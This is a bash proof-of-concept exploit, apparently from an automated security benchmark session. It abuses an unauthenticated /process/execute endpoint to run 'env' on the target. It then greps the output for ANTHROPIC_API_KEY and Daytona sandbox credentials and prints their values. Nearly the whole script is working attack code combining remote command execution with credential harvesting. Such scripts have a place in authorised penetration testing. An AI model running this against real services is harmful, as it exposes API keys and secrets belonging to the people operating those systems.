#!/bin/bash
# POC: Demonstrates environment variable and sensitive credential exposure through unauthenticated /process/execute endpoint using the 'env' command
# Target: ./repo
# Created: 2025-11-06T19:40:15.085Z
# Session: benchmark-XBEN-098-24-mhntqov2

# Environment Variable Exposure via RCE POC
# Demonstrates extraction of sensitive credentials from /process/execute endpoint
# Target: POST /process/execute endpoint
# Method: Execute 'env' command to enumerate all environment variables

TARGET_URL="${1:-http://localhost:8000}"
ENDPOINT="/process/execute"

echo "[*] Environment Variable Exposure via RCE POC"
echo "[*] Target: $TARGET_URL$ENDPOINT"
echo ""

# Execute env command through vulnerable endpoint
echo "[*] Sending POST request with 'env' command..."
RESPONSE=$(curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"command":"env"}' \
  "$TARGET_URL$ENDPOINT")

echo "[*] Response received:"
echo "$RESPONSE" | jq . 2>/dev/null || echo "$RESPONSE"
echo ""

# Parse and display sensitive credentials
echo "[*] Analyzing response for sensitive data..."
echo ""

# Check for ANTHROPIC_API_KEY
if echo "$RESPONSE" | grep -q "ANTHROPIC_API_KEY"; then
  echo "[!] CRITICAL: ANTHROPIC_API_KEY found in environment!"
  API_KEY=$(echo "$RESPONSE" | grep -oP 'ANTHROPIC_API_KEY["\s:]*\K[^",\n}]+' | head -1)
  echo "    API Key: $API_KEY"
  echo ""
fi

# Check for DAYTONA credentials
if echo "$RESPONSE" | grep -q "DAYTONA_SANDBOX_ID"; then
  echo "[!] CRITICAL: DAYTONA_SANDBOX_ID found in environment!"
  SANDBOX_ID=$(echo "$RESPONSE" | grep -oP 'DAYTONA_SANDBOX_ID["\s:]*\K[^",\n}]+' | head -1)
  echo "    Sandbox ID: $SANDBOX_ID"
  echo ""
fi

if echo "$RESPONSE" | grep -q "DAYTONA_SANDBOX_USER"; then
  echo "[!] CRITICAL: DAYTONA_SANDBOX_USER found in environment!"
  SANDBOX_USER=$(echo "$RESPONSE" | grep -oP 'DAYTONA_SANDBOX_USER["\s:]*\K[^",\n}]+' | head -1)
  echo "    Sandbox User: $SANDBOX_USER"
  echo ""
fi

# Check exit code
if echo "$RESPONSE" | grep -q '"exitCode":0'; then
  echo "[+] Command executed successfully (exitCode: 0)"
  echo ""
fi

# Display all environment variables found
echo "[*] All environment variables detected:"
echo "$RESPONSE" | jq '.stdout' 2>/dev/null | head -20 || echo "$RESPONSE" | grep -o '[A-Z_]*=' | sort -u

echo ""
echo "[+] POC Complete - Sensitive environment variables are exposed!"